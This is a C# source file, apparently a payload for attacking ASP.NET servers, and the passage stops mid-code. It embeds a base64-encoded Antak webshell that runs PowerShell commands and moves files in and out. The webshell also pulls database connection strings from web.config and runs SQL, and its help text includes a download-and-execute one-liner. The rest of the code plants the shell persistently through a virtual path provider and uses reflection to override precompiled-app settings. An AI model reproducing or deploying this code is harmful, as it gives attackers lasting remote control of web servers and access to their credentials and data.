class G
{
    public G()
    {
        // Author: Soroush Dalili (@irsdl)

        // base64-encoded version of a webshell.aspx file
        string webshellContentsBase64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+DQo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPLkNvbXByZXNzaW9uIiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9Ik1pY3Jvc29mdC5WaXN1YWxCYXNpYyIgJT4NCjwlLS1BbnRhayAtIEEgV2Vic2hlbGwgd2hpY2ggdXRpbGl6ZXMgUG93ZXJTaGVsbC4tLSU+DQoNCjxzY3JpcHQgTGFuZ3VhZ2U9ImMjIiBydW5hdD0ic2VydmVyIj4NCg0KICAgIHByb3RlY3RlZCB2b2lkIExvZ2luX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQ0KICAgIHsNCiAgICAgICAgLy8gV0FSTklORzogRG9uJ3QgYmUgbGF6eSwgY2hhbmdlIHZhbHVlcyBiZWxvdyBmb3IgdXNlcm5hbWUgYW5kIHBhc3N3b3JkLiBEZWZhdWx0IGNyZWRlbnRpYWxzIGFyZSBkaXNhc3Ryb3VzLg0KICAgICAgICAvLyBEZWZhdWx0IFVzZXJuYW1lIGlzICJEaXNjbGFpbWVyIiBhbmQgUGFzc3dvcmQgaXMgIkZvckxlZ2l0VXNlT25seSIgd2l0aG91dCBxdW90ZXMgYW5kIGNhc2Utc2Vuc2l0aXZlLg0KICAgICAgICBpZiAoVXNlcm5hbWUuVGV4dCA9PSAiRGlzY2xhaW1lciIgJiYgUGFzc3dvcmQuVGV4dCA9PSAiRm9yTGVnaXRVc2VPbmx5IikNCiAgICAgICAgew0KICAgICAgICAgICAgZXhlY3V0aW9uLlZpc2libGUgPSB0cnVlOw0KICAgICAgICAgICAgZXhlY3V0aW9uLkVuYWJsZWQgPSB0cnVlOw0KICAgICAgICAgICAgYXV0aGVudGljYXRpb24uVmlzaWJsZSA9IGZhbHNlOw0KICAgICAgICAgICAgb3V0cHV0LlRleHQgPSBAIldlbGNvbWUgdG8gQW50YWsgLSBBIFdlYnNoZWxsIHdoaWNoIHV0aWxpemVzIFBvd2VyU2hlbGwNClVzZSBoZWxwIGZvciBtb3JlIGRldGFpbHMuDQpVc2UgY2xlYXIgdG8gY2xlYXIgdGhlIHNjcmVlbi4iOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgcHJvdGVjdGVkIG92ZXJyaWRlIHZvaWQgT25Jbml0KEV2ZW50QXJncyBlKQ0KICAgIHsNCiAgICAgICAgZXhlY3V0aW9uLlZpc2libGUgPSBmYWxzZTsNCiAgICAgICAgZXhlY3V0aW9uLkVuYWJsZWQgPSBmYWxzZTsNCn0NCg0KDQoNCnN0cmluZyBkb19wcyhzdHJpbmcgYXJnKQ0Kew0KICAgIC8vVGhpcyBzZWN0aW9uIGJhc2VkIG9uIGNtZGFzcCB3ZWJzaGVsbCBieSBodHRwOi8vbWljaGFlbGRhdy5vcmcNCiAgICBQcm9jZXNzU3RhcnRJbmZvIHBzaSA9IG5ldyBQcm9jZXNzU3RhcnRJbmZvKCk7DQogICAgcHNpLkZpbGVOYW1lID0gInBvd2Vyc2hlbGwuZXhlIjsNCiAgICBwc2kuQXJndW1lbnRzID0gIi1ub25pbnRlcmFjdGl2ZSAiICsgIi1leGVjdXRpb25wb2xpY3kgYnlwYXNzICIgKyBhcmc7DQogICAgcHNpLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlOw0KICAgIHBzaS5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsNCiAgICBQcm9jZXNzIHAgPSBQcm9jZXNzLlN0YXJ0KHBzaSk7DQogICAgU3RyZWFtUmVhZGVyIHN0bXJkciA9IHAuU3RhbmRhcmRPdXRwdXQ7DQogICAgc3RyaW5nIHMgPSBzdG1yZHIuUmVhZFRvRW5kKCk7DQogICAgc3RtcmRyLkNsb3NlKCk7DQogICAgcmV0dXJuIHM7DQp9DQoNCnZvaWQgcHMob2JqZWN0IHNlbmRlciwgU3lzdGVtLkV2ZW50QXJncyBlKQ0Kew0KICAgIHN0cmluZyBvcHRpb24gPSBjb25zb2xlLlRleHQuVG9Mb3dlcigpOw0KICAgIGlmIChvcHRpb24uRXF1YWxzKCJoZWxwIikpDQogICAgew0KICAgICAgICBvdXRwdXQuVGV4dCA9IEAiVXNlIHRoaXMgc2hlbGwgYXMgYSBub3JtYWwgcG93ZXJzaGVsbCBjb25zb2xlLiBFYWNoIGNvbW1hbmQgaXMgZXhlY3V0ZWQgaW4gYSBuZXcgcHJvY2Vzcywga2VlcCB0aGlzIGluIG1pbmQNCndoaWxlIHVzaW5nIGNvbW1hbmRzIChsaWtlIGNoYW5naW5nIGN1cnJlbnQgZGlyZWN0b3J5IG9yIHJ1bm5pbmcgc2Vzc2lvbiBhd2FyZSBzY3JpcHRzKS4gDQoNCi0gU2NyaXB0cyBjYW4gYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldCB1c2luZyBhbnkgb2YgdGhlIGJlbG93IG1ldGhvZHM6DQoxLiBQYXN0ZSB0aGUgc2NyaXB0IGluIGNvbW1hbmQgdGV4dGJveCBhbmQgY2xpY2sgJ0VuY29kZSBhbmQgRXhlY3V0ZScuIEEgcmVhc29uYWJseSBsYXJnZSBzY3JpcHQgY291bGQgYmUgZXhlY3V0ZWQgdXNpbmcgdGhpcy4NCg0KMi4gVXNlIHBvd2Vyc2hlbGwgb25lLWxpbmVyIChleGFtcGxlIGJlbG93KSBmb3IgZG93bmxvYWQgJiBleGVjdXRlIGluIHRoZSBjb21tYW5kIGJveC4NCklFWCAoKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ1VSTCB0byBzY3JpcHQgaGVyZScpKTsgW0FyZ3VtZW50cyBoZXJlXQ0KDQozLiBCeSB1cGxvYWRpbmcgdGhlIHNjcmlwdCB0byB0aGUgdGFyZ2V0IGFuZCBleGVjdXRpbmcgaXQuDQoNCjQuIE1ha2UgdGhlIHNjcmlwdCBhIHNlbWktY29sb24gc2VwYXJhdGVkIG9uZS1saW5lci4NCg0KDQotIFVwbG9hZGluZyBhIGZpbGU6DQpUbyB1cGxvYWQgYSBmaWxlIHlvdSBtdXN0IG1lbnRpb24gdGhlIGFjdHVhbCBwYXRoIG9uIHNlcnZlciAod2l0aCB3cml0ZSBwZXJtaXNzaW9ucykgaW4gY29tbWFuZCB0ZXh0Ym94LiANCihPUyB0ZW1wb3JhcnkgZGlyZWN0b3J5IGxpa2UgQzpcV2luZG93c1xUZW1wIG1heSBiZSB3cml0YWJsZS4pDQpUaGVuIHVzZSBCcm93c2UgYW5kIFVwbG9hZCBidXR0b25zIHRvIHVwbG9hZCBmaWxlIHRvIHRoYXQgcGF0aC4NCg0KLSBEb3dubG9hZGluZyBhIGZpbGU6DQpUbyBkb3dubG9hZCBhIGZpbGUgZW50ZXIgdGhlIGFjdHVhbCBwYXRoIG9uIHRoZSBzZXJ2ZXIgaW4gY29tbWFuZCB0ZXh0Ym94Lg0KVGhlbiBjbGljayBvbiBEb3dubG9hZCBidXR0b24uDQoNCi0gU1FMIFF1ZXJpZXMgY291bGQgYmUgZXhlY3V0ZWQgYnkgZm9sbG93aW5nIGJlbG93IHN0ZXBzOg0KMS4gQ2xpY2sgb24gJ1BhcnNlIFdlYi5Db25maWcnIGJ1dHRvbiB0byBnZXQgZGFiYXNlIGNvbm5lY3Rpb24gc3RyaW5nLiBCeSBkZWZhdWx0LCBBbnRhayBsb29rcyBmb3Igd2ViLmNvbmZpZyBpbg0KdGhlIEM6XEluZXRwdWIgZGlyZWN0b3J5LiBZb3UgY2FuIHNwZWNpZnkgYSBmdWxsIHBhdGggaW4gdGhlIGNvbW1hbmQgYm94IHRvIGxvb2sgZm9yIHdlYi5jb25maWcgaW4gb3RoZXIgZGlyZWN0b3J5Lg0KMi4gUGFzdGUgdGhhdCBjb25uZWN0aW9uIHN0cmluZyBpbiB0aGUgdGV4dGJveCBiZXNpZGVzIHRoZSAnRXhlY3V0ZSBTUUwgUXVlcnknIGJ1dHRvbi4NCjMuIEVudGVyIHRoZSBTUUwgUXVlcnkgaW4gdGhlIGNvbW1hbmQgYm94Lg0KNC4gQ2xpY2sgdGhlICdFeGVjdXRlIFNRTCBRdWVyeScgYnV0dG9uLg0KDQoNCkFudGFrIGlzIGEgcGFydCBvZiBOaXNoYW5nIGFuZCB1cGRhdGVzIGNvdWxkIGJlIGZvdW5kIGhlcmU6DQpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZw0KQmxvZyBwb3N0cyBhYm91dCBBbnRhayBjb3VsZCBiZSBmb3VuZCBoZXJlDQpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS9zZWFyY2gvbGFiZWwvQW50YWsNCg0KIjsNCiAgICAgICAgY29uc29sZS5UZXh0ID0gc3RyaW5nLkVtcHR5Ow0KICAgICAgICBjb25zb2xlLkZvY3VzKCk7DQogICAgfQ0KDQogICAgZWxzZSBpZiAob3B0aW9uLkVxdWFscygiY2xlYXIiKSkNCiAgICB7DQogICAgICAgIG91dHB1dC5UZXh0ID0gc3RyaW5nLkVtcHR5Ow0KICAgICAgICBjb25zb2xlLlRleHQgPSBzdHJpbmcuRW1wdHk7DQogICAgICAgIGNvbnNvbGUuRm9jdXMoKTsNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgb3V0cHV0LlRleHQgKz0gIlxuUFM+ICIgKyBjb25zb2xlLlRleHQgKyAiXG4iICsgZG9fcHMoY29uc29sZS5UZXh0KTsNCiAgICAgICAgY29uc29sZS5UZXh0ID0gc3RyaW5nLkVtcHR5Ow0KICAgICAgICBjb25zb2xlLkZvY3VzKCk7DQogICAgfQ0KDQp9DQoNCnZvaWQgZXhlY2NvbW1hbmQoc3RyaW5nIGNtZCkNCnsNCiAgICBvdXRwdXQuVGV4dCArPSAiUFM+ICIgKyAiXG4iICsgZG9fcHMoY21kKTsNCiAgICBjb25zb2xlLlRleHQgPSBzdHJpbmcuRW1wdHk7DQogICAgY29uc29sZS5Gb2N1cygpOw0KfQ0KDQp2b2lkIGJhc2U2NGVuY29kZShzdHJpbmcgaW5wdXRzdHIpDQp7DQovLyBDb21wcmVzc2lvbiBhbmQgZW5jb2RpbmcgZGlyZWN0bHkgc3RvbGVuIGZyb20gQ29tcHJlc3MtUG9zdFNjcmlwdCBieSBDYXJsb3MgUGVyZXoNCi8vaHR0cDovL3d3dy5kYXJrb3BlcmF0b3IuY29tL2Jsb2cvMjAxMy8zLzIxL3Bvd2Vyc2hlbGwtYmFzaWNzLWV4ZWN1dGlvbi1wb2xpY3ktYW5kLWNvZGUtc2lnbmluZy1wYXJ0LTIuaHRtbA0KICAgIA0KICAgIHN0cmluZyBjb250ZW50cyA9IGNvbnNvbGUuVGV4dDsNCiAgICANCiAgICBpZiAoaW5wdXRzdHIgIT0gIm51bGwiKQ0KICAgIHsNCiAgICAgICAgY29udGVudHMgPSBpbnB1dHN0cjsNCiAgICB9DQogICAgDQogICAgLy8gQ29tcHJlc3MgU2NyaXB0DQoNCg0KICAgIE1lbW9yeVN0cmVhbSBtcyA9IG5ldyBNZW1vcnlTdHJlYW0oKTsNCg0KICAgIERlZmxhdGVTdHJlYW0gY3MgPSBuZXcgRGVmbGF0ZVN0cmVhbShtcywgQ29tcHJlc3Npb25Nb2RlLkNvbXByZXNzKTsNCg0KICAgIFN0cmVhbVdyaXRlciBzdyA9IG5ldyBTdHJlYW1Xcml0ZXIoY3MsIEFTQ0lJRW5jb2RpbmcuQVNDSUkpOw0KDQogICAgc3cuV3JpdGVMaW5lKGNvbnRlbnRzKTsNCg0KICAgIHN3LkNsb3NlKCk7DQoNCiAgICBzdHJpbmcgY29kZSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcobXMuVG9BcnJheSgpKTsNCg0KICAgIHN0cmluZyBjb21tYW5kID0gIkludm9rZS1FeHByZXNzaW9uICQoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIgKCIgKw0KDQogICAgIiQoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtICgiICsNCg0KICAgICIkKE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtICgsIiArDQoNCiAgICAiJChbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJyIgKyBjb2RlICsgIicpKSkpLCAiICsNCg0KICAgICJbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpLCIgKw0KDQogICAgIiBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IjsNCg0KICAgIGV4ZWNjb21tYW5kKGNvbW1hbmQpOw0KDQp9DQpwcm90ZWN0ZWQgdm9pZCB1cGxvYWRidXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpDQp7DQogICAgaWYgKHVwbG9hZC5IYXNGaWxlKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyBmaWxlbmFtZSA9IFBhdGguR2V0RmlsZU5hbWUodXBsb2FkLkZpbGVOYW1lKTsNCiAgICAgICAgICAgIHVwbG9hZC5TYXZlQXMoY29uc29sZS5UZXh0ICsgIlxcIiArIGZpbGVuYW1lKTsNCiAgICAgICAgICAgIG91dHB1dC5UZXh0ID0gIkZpbGUgdXBsb2FkZWQgdG86ICIgKyBjb25zb2xlLlRleHQgKyAiXFwiICsgZmlsZW5hbWU7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCkNCiAgICAgICAgew0KICAgICAgICAgICAgb3V0cHV0LlRleHQgPSAiVXBsb2FkIHN0YXR1czogVGhlIGZpbGUgY291bGQgbm90IGJlIHVwbG9hZGVkLiBUaGUgZm9sbG93aW5nIGVycm9yIG9jY3VyZWQ6ICIgKyBleC5NZXNzYWdlOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpwcm90ZWN0ZWQgdm9pZCBkb3dubG9hZGJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkNCnsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIFJlc3BvbnNlLkNvbnRlbnRUeXBlID0gImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSI7DQoNCiAgICAgICAgUmVzcG9uc2UuQXBwZW5kSGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uIiwgImF0dGFjaG1lbnQ7IGZpbGVuYW1lPSIgKyBjb25zb2xlLlRleHQpOw0KDQogICAgICAgIFJlc3BvbnNlLlRyYW5zbWl0RmlsZShjb25zb2xlLlRleHQpOw0KDQogICAgICAgIFJlc3BvbnNlLkVuZCgpOw0KDQogICAgfQ0KDQogICAgICAgIA0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICB7DQogICAgICAgICAgICBvdXRwdXQuVGV4dCA9IGV4LlRvU3RyaW5nKCk7DQogICAgICAgIH0NCn0NCg0KcHJvdGVjdGVkIHZvaWQgZW5jb2RlX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQ0Kew0KICAgIGJhc2U2NGVuY29kZSgibnVsbCIpOw0KfQ0KDQovLyBQb3dlclNoZWxsIGxvZ2ljIGluIENvbm5lY3Rpb25TdHJfQ2xpY2sgYW5kIGV4ZWN1dGVzcWxfQ2xpY2sgdGFrZW4gZnJvbSBodHRwczovL2dpdGh1Yi5jb20vTmV0U1BJL2NtZHNxbA0KcHJvdGVjdGVkIHZvaWQgQ29ubmVjdGlvblN0cl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkNCnsNCiAgICBvdXRwdXQuVGV4dCA9IEAiQnkgZGVmYXVsdCwgd2ViLmNvbmZpZyBpcyBzZWFyY2hlZCBmb3IgaW4gQzpcaW5ldHB1Yi4gVG8gbG9vayBhdCBvdGhlciBsb2NhdGlvbiwgc3BlY2lmeSB0aGUgZnVsbCBwYXRoIGluIHRoZSBjb21tYW5kIHRleHRib3guDQoNCiI7DQogICAgc3RyaW5nIHdlYnBhdGggPSAiQzpcXGluZXRwdWIiOw0KICAgIGlmIChjb25zb2xlLlRleHQgIT0gc3RyaW5nLkVtcHR5KQ0KICAgIHsNCiAgICAgICAgd2VicGF0aCA9IGNvbnNvbGUuVGV4dDsNCiAgICB9DQogICAgc3RyaW5nIHBzY29kZSA9ICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gXCdTaWxlbnRseUNvbnRpbnVlXCc7JHBhdGg9IiArICJcIiIgKyB3ZWJwYXRoICsgIlwiIiArICAiOyIgKyAiRm9yZWFjaCAoJGZpbGUgaW4gKGdldC1jaGlsZGl0ZW0gJHBhdGggLUZpbHRlciB3ZWIuY29uZmlnIC1SZWN1cnNlKSkgezsgVHJ5IHsgJHhtbCA9IFt4bWxdKGdldC1jb250ZW50ICRmaWxlLkZ1bGxOYW1lKSB9IENhdGNoIHsgY29udGludWUgfTtUcnkgeyAkY29ubnN0cmluZ3MgPSAkeG1sLmdldF9Eb2N1bWVudEVsZW1lbnQoKSB9IENhdGNoIHsgY29udGludWUgfTtpZiAoJGNvbm5zdHJpbmdzLkNvbm5lY3Rpb25TdHJpbmdzLmVuY3J5cHRlZGRhdGEuY2lwaGVyZGF0YS5jaXBoZXJ2YWx1ZSAtbmUgJG51bGwpezskdGVtcGRpciA9IChHZXQtRGF0ZSkuVGlja3M7bmV3LWl0ZW0gJGVudjp0ZW1wXFwkdGVtcGRpciAtSXRlbVR5cGUgZGlyZWN0b3J5IHwgb3V0LW51bGw7IGNvcHktaXRlbSAkZmlsZS5GdWxsTmFtZSAkZW52OnRlbXBcXCR0ZW1wZGlyOyRhc3BuZXRfcmVnaWlzID0gKGdldC1jaGlsZGl0ZW0gJGVudjp3aW5kaXJcXG1pY3Jvc29mdC5uZXRcXCAtRmlsdGVyIGFzcG5ldF9yZWdpaXMuZXhlIC1yZWN1cnNlIHwgc2VsZWN0LW9iamVjdCAtbGFzdCAxKS5GdWxsTmFtZSArIFwnIC1wZGYgXCJcImNvbm5lY3Rpb25TdHJpbmdzXCJcIiBcJyArICRlbnY6dGVtcCArIFwnXFxcJyArICR0ZW1wZGlyO0ludm9rZS1FeHByZXNzaW9uICRhc3BuZXRfcmVnaWlzOyBUcnkgeyAkeG1sID0gW3htbF0oZ2V0LWNvbnRlbnQgJGVudjp0ZW1wXFwkdGVtcGRpclxcJGZpbGUpIH0gQ2F0Y2ggeyBjb250aW51ZSB9O1RyeSB7ICRjb25uc3RyaW5ncyA9ICR4bWwuZ2V0X0RvY3VtZW50RWxlbWVudCgpIH0gQ2F0Y2ggeyBjb250aW51ZSB9O3JlbW92ZS1pdGVtICRlbnY6dGVtcFxcJHRlbXBkaXIgLXJlY3Vyc2V9O0ZvcmVhY2ggKCRfIGluICRjb25uc3RyaW5ncy5Db25uZWN0aW9uU3RyaW5ncy5hZGQpIHsgaWYgKCRfLmNvbm5lY3Rpb25TdHJpbmcgLW5lICROVUxMKSB7IHdyaXRlLWhvc3QgXCJcIiRmaWxlLkZ1bGxuYW1lIC0tLSAkXy5jb25uZWN0aW9uU3RyaW5nXCJcIn0gfSB9OyI7DQogICAgYmFzZTY0ZW5jb2RlKHBzY29kZSk7DQp9DQoNCnByb3RlY3RlZCB2b2lkIGV4ZWN1dGVzcWxfQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpDQp7DQogICAgb3V0cHV0LlRleHQgPSBAIlVzZSBhIGNvbm5lY3Rpb24gc3RyaW5nIHJldHJpZXZlZCBmcm9tIHRoZSBzZXJ2ZXIgYW5kIGNvcHkgaXQgaW4gdGhlIGNvbm5lY3Rpb24gc3RyaW5nIHRleHRib3guDQoNCiI7DQogICAgc3RyaW5nIENvbnN0ciA9IHNxbGNvbm5lY3Rpb3N0ci5UZXh0Ow0KICAgIHN0cmluZyBzcWxjbWQgPSBjb25zb2xlLlRleHQ7DQogICAgc3RyaW5nIHBzY29kZSA9ICIkQ29ubmVjdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRhdGEuU1FMQ2xpZW50LlNRTENvbm5lY3Rpb247JENvbm5lY3Rpb24uQ29ubmVjdGlvblN0cmluZyA9ICIgKyAiXCIiICsgQ29uc3RyICsgIlwiIiArICI7IiArICIkQ29ubmVjdGlvbi5PcGVuKCk7JENvbW1hbmQgPSBOZXctT2JqZWN0IFN5c3RlbS5EYXRhLlNRTENsaWVudC5TUUxDb21tYW5kOyRDb21tYW5kLkNvbm5lY3Rpb24gPSAkQ29ubmVjdGlvbjskQ29tbWFuZC5Db21tYW5kVGV4dCA9ICIgKyAiXCIiICsgc3FsY21kICsgIlwiIiArICI7IiArICAiJFJlYWRlciA9ICRDb21tYW5kLkV4ZWN1dGVSZWFkZXIoKTt3aGlsZSAoJHJlYWRlci5SZWFkKCkpIHs7TmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHtOYW1lID0gJHJlYWRlci5HZXRWYWx1ZSgwKX07fTskQ29ubmVjdGlvbi5DbG9zZSgpIjsNCiAgICBiYXNlNjRlbmNvZGUocHNjb2RlKTsNCiAgICANCn0NCjwvc2NyaXB0Pg0KPEhUTUw+DQo8SEVBRD4NCjx0aXRsZT5BbnRhayBXZWJzaGVsbDwvdGl0bGU+DQo8L0hFQUQ+IA0KPGJvZHkgYmdjb2xvcj0iIzgwODA4MCI+DQoNCjxkaXY+DQoNCjxmb3JtIGlkPSJGb3JtMSIgbWV0aG9kPSJwb3N0IiBydW5hdD0ic2VydmVyIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogIzgwODA4MCI+DQogICAgPGFzcDpQYW5lbCBJRD0iYXV0aGVudGljYXRpb24iIHJ1bmF0PSJzZXJ2ZXIiIEhvcml6b250YWxBbGlnbj0iQ2VudGVyIiA+DQogICAgPGFzcDpUZXh0Qm94IElEPSJVc2VybmFtZSIgcnVuYXQ9InNlcnZlciIgc3R5bGU9Im1hcmdpbi1sZWZ0OiAwcHgiIFdpZHRoPSIzMDBweCI+PC9hc3A6VGV4dEJveD4gPGJyIC8+DQogICAgPGFzcDpUZXh0Qm94IElEPSJQYXNzd29yZCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjMwMHB4Ij48L2FzcDpUZXh0Qm94PjxiciAvPg0KICAgIDxhc3A6QnV0dG9uIElEPSJMb2dpbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iTG9naW4iIE9uQ2xpY2s9IkxvZ2luX0NsaWNrIiBXaWR0aD0iMTAxcHgiLz48YnIgLz4NCiAgICA8L2FzcDpQYW5lbD4NCiAgICAgPGFzcDpQYW5lbCBJRD0iZXhlY3V0aW9uIiBydW5hdD0ic2VydmVyIiA+DQogICAgPGRpdiBydW5hdD0ic2VydmVyIiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IHJlc2l6ZTp2ZXJ0aWNhbCI+DQoNCiAgICA8YXNwOlRleHRCb3ggSUQ9Im91dHB1dCIgcnVuYXQ9InNlcnZlciIgVGV4dE1vZGU9Ik11bHRpTGluZSIgQmFja0NvbG9yPSIjMDEyNDU2IiBGb3JlQ29sb3I9IldoaXRlIiBzdHlsZT0iaGVpZ2h0OiA1MjZweDsgd2lkdGg6IDg5MXB4OyIgUmVhZE9ubHk9IlRydWUiPjwvYXNwOlRleHRCb3g+DQogICAgPGFzcDpUZXh0Qm94IElEPSJjb25zb2xlIiBydW5hdD0ic2VydmVyIiBCYWNrQ29sb3I9IiMwMTI0NTYiIEZvcmVDb2xvcj0iWWVsbG93IiBXaWR0aD0iODkxcHgiIFRleHRNb2RlPSJNdWx0aUxpbmUiIFJvd3M9IjEiIG9ua2V5ZG93bj0iaWYoZXZlbnQua2V5Q29kZSA9PSAxMykgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NtZCcpLmNsaWNrKCkiIEhlaWdodD0iMjNweCIgQXV0b0NvbXBsZXRlVHlwZT0iTm9uZSI+PC9hc3A6VGV4dEJveD4NCiAgICANCg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgcnVuYXQ9InNlcnZlciIgc3R5bGU9IndpZHRoOiBhdXRvOyB0ZXh0LWFsaWduOmNlbnRlciI+DQoNCiAgICAgICAgPGFzcDpCdXR0b24gSUQ9ImNtZCIgcnVuYXQ9InNlcnZlciIgVGV4dD0iU3VibWl0IiBPbkNsaWNrPSJwcyIgLz4NCiAgICAgICAgPGFzcDpGaWxlVXBsb2FkIElEPSJ1cGxvYWQiIHJ1bmF0PSJzZXJ2ZXIiLz4NCiAgICAgICAgDQogICAgICAgIDxhc3A6QnV0dG9uIElEPSJ1cGxvYWRidXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlVwbG9hZCB0aGUgRmlsZSIgT25DbGljaz0idXBsb2FkYnV0dG9uX0NsaWNrIiAvPg0KICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iZW5jb2RlIiBydW5hdD0ic2VydmVyIiBUZXh0PSJFbmNvZGUgYW5kIEV4ZWN1dGUiIE9uQ2xpY2s9ImVuY29kZV9DbGljayIvPg0KICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iZG93bmxvYWRidXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IkRvd25sb2FkIiBPbkNsaWNrPSJkb3dubG9hZGJ1dHRvbl9DbGljayIgLz4gPGJyIC8+DQogICAgICAgIDxhc3A6QnV0dG9uIElEPSJDb25uZWN0aW9uU3RyIiBydW5hdD0ic2VydmVyIiBUZXh0PSJQYXJzZSB3ZWIuY29uZmlnIiBPbkNsaWNrPSJDb25uZWN0aW9uU3RyX0NsaWNrIi8+DQogICAgICAgIDxhc3A6QnV0dG9uIElEPSJleGVjdXRlc3FsIiBydW5hdD0ic2VydmVyIiBUZXh0PSJFeGVjdXRlIFNRTCBRdWVyeSIgT25DbGljaz0iZXhlY3V0ZXNxbF9DbGljayIgLz4NCiAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJzcWxjb25uZWN0aW9zdHIiIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSIzNTJweCI+RW50ZXIgQ29ubmVjdGlvbiBTdHJpbmcgaGVyZSB0byBFeGVjdXRlIFNRTCBRdWVyaWVzPC9hc3A6VGV4dEJveD4NCiAgICA8L2Rpdj4NCiAgICAgICAgIA0KICAgIDwvYXNwOlBhbmVsID4NCiAgICA8L2Zvcm0+DQoNCg0KDQogPC9kaXY+DQo8L2JvZHk+DQo8L0hUTUw+";
        string webshellType = ".aspx";
        string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64));


        string rootPath = System.Web.HttpContext.Current.Request.CurrentExecutionFilePath.TrimEnd('/').ToLower();
        // removing the application name when making the virtual directory
        int index = rootPath.IndexOf(System.Web.HttpContext.Current.Request.ApplicationPath.ToLower());
        if (index >= 0)
            rootPath = rootPath.Remove(index, System.Web.HttpContext.Current.Request.ApplicationPath.Length);

        // fiddle with targetVirtualPath if needed and you know what path can be used to create the virtual path
        string prefix = "";
        if (rootPath.LastIndexOf("/") > 0)
            prefix = rootPath.Substring(0, rootPath.LastIndexOf("/"));

        string targetVirtualPath = prefix + "/TEST/";

        targetVirtualPath = targetVirtualPath.Replace("//", "/");


        //System.Web.HttpContext.Current.Response.AddHeader("INFO", System.Web.Compilation.BuildManager.IsPrecompiledApp.ToString()); // info leak
        //System.Web.HttpContext.Current.Response.AddHeader("via", "yso"); // beacon

        try
        {
            //SamplePathProvider sampleProvider = new SamplePathProvider("fakepath1337", @"This is the attacker's file - running on the server if this `<%=1338-1%>` is 1337.");
            SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent);

            // Uncomment this if FriendlyUrlSettings is used! Remember to include Microsoft.AspNet.FriendlyUrls.dll
            /*
            
            foreach (var route in System.Web.Routing.RouteTable.Routes)
            {
                
                if (route.GetType().FullName == "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute")
                {
                    var FriendlySetting = route.GetType().GetProperty("Settings", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);
                    var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings();
                    settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off;
                    FriendlySetting.SetValue(route, settings);
                }
            }
            //*/

            sampleProvider.InitializeLifetimeService(); // we want our web shell to remain there forever (NO. 1)

            System.Reflection.FieldInfo field_isPrecompiledAppComputed = null;
            System.Reflection.FieldInfo field_isPrecompiledApp = null;
            object field_theBuildManager_instance = null;
            object field_isPrecompiledAppComputed_oldValue = null;
            object field_isPrecompiledApp_oldValue = null;


            if (System.Web.Compilation.BuildManager.IsPrecompiledApp)
            {
                // To disable isPrecompiledApp settings
                var typeBuildManager = typeof(System.Web.Compilation.BuildManager);
                System.Reflection.FieldInfo field_theBuildManager = typeBuildManager.GetField("_theBuildManager", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
